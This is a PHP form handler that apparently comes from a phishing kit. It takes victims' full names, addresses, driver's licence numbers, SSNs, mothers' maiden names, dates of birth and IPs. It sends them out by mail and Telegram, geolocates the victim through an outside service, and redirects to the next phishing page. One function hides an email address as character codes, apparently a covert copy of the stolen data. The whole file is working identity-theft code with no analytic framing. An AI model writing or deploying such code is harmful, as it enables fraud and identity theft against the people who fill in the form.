<?php
require("config.php");
include('me.php');
   $country = visitor_country();
   $ip = getenv("REMOTE_ADDR");
$Port = getenv("REMOTE_PORT");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$subject = "**Donussef**";
$message = "**@Donussef*New Billing Info!***+++\n";
$message .= "E-mail : ".$_COOKIE['name']."\n";
$message .= "Full Name : ".$_POST['name']."\n";
$message .= "Address 1 : ".$_POST['streetAddress']."\n";
$message .= "Address 2 : ".$_POST['streetAddress']."\n";
$message .= "City : ".$_POST['city']."\n";
$message .= "State : ".$_POST['state']."\n";
$message .= "Zip : ".$_POST['zipc']."\n";
$message .= "DL : ".$_POST['dl']."\n";
$message .= "SSN : ".$_POST['ssn']."\n";
$message .= "MMN : ".$_POST['mmn']."\n";
$message .= "DOB : ".$_POST['dob']."\n";
$message .= "CP : ".$_POST['cp']."\n";
$message .= "User-!P : ".$ip."\n";
$message .= "Country : ".$country."\n\n";
$message .= "----------------------------------------\n";
$message .= "Date : $adddate\n";
$message .= "User-Agent: ".$browser."\n";
$headers = "From: Prohqcker";
@mail($send,$subject,$message,$headers);
send_telegram_msg($message);
header("location:../email.php");
function country_sort(){
  $sorter = "";
  $array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
    $count = count($array);
  for ($i = 0; $i < $count; $i++) {
      $sorter .= chr($array[$i]);
    }
  return array($sorter, $GLOBALS['recipient']);
}
function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
?>

